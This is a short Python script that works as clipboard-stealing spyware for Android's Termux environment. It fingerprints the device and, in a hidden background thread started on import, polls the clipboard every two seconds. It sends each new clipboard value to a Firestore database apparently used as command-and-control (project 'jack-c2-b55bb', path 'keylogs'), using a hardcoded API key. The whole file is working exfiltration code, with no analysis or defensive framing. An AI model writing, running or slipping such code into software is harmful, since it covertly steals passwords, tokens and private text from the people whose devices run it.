import os, time, subprocess, json, hashlib, threading, urllib.request

PROJECT_ID = "jack-c2-b55bb"
API_KEY = "AIzaSyBuw3qWiY8VXffwyJH422ocsNZuiDTyKXI"
DID = hashlib.md5((os.uname().nodename + str(__import__("uuid").getnode())).encode()).hexdigest()[:16]
POLL_INTERVAL = 2


def _url(path):
    return "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/" + path + "?key=" + API_KEY


def _clip():
    try:
        r = subprocess.run(["termux-clipboard-get"], capture_output=True, timeout=5)
        return r.stdout.decode("utf-8", "ignore").strip()
    except Exception:
        return ""


def _set(path, data):
    try:
        fields = {}
        for k, v in data.items():
            if isinstance(v, int) and not isinstance(v, bool):
                fields[k] = {"integerValue": str(v)}
            else:
                fields[k] = {"stringValue": str(v)}
        body = json.dumps({"fields": fields}).encode()
        req = urllib.request.Request(_url(path), data=body, method="PATCH", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            r.read()
        return True
    except Exception:
        return False


def _loop():
    last = ""
    while True:
        try:
            cur = _clip()
            if cur and cur != last:
                last = cur
                _set("devices/" + DID + "/keylogs/" + str(int(time.time() * 1000)), {
                    "content": cur[:5000], "ts": int(time.time())
                })
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)


threading.Thread(target=_loop, daemon=True).start()